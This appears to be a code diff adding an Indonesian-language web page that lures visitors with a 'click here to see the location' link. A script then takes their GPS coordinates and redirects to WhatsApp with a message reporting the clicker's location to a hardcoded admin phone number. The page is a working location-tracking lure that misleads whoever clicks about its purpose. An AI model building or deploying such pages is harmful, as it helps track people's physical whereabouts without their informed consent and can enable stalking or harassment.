@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Track Lokasi Klik</title>
+</head>
+<body>
+    <h2>Klik Link Ini untuk Melihat Lokasi</h2>
+    <a href="#" onclick="sendLocation()">Klik di sini</a>
+
+    <script>
+        function sendLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function (position) {
+                    let latitude = position.coords.latitude;
+                    let longitude = position.coords.longitude;
+                    let googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                    
+                    // Nomor WhatsApp Admin (ganti dengan nomor admin)
+                    let adminPhone = "6285211226976"; // Format internasional (62 untuk Indonesia)
+                    
+                    // Pesan yang akan dikirim ke admin
+                    let message = `🚨 Ada yang klik link!\n🌍 Lokasi mereka: ${googleMapsLink}`;
+                    let whatsappLink = `https://wa.me/${adminPhone}?text=${encodeURIComponent(message)}`;
+                    
+                    // Redirect ke WhatsApp Admin
+                    window.location.href = whatsappLink;
+
+                }, function (error) {
+                    alert("❌ Gagal mendapatkan lokasi! Pastikan GPS aktif.");
+                });
+            } else {
+                alert("❌ Geolocation tidak didukung oleh browser ini.");
+            }
+        }
+    </script>
+</body>
+</html>
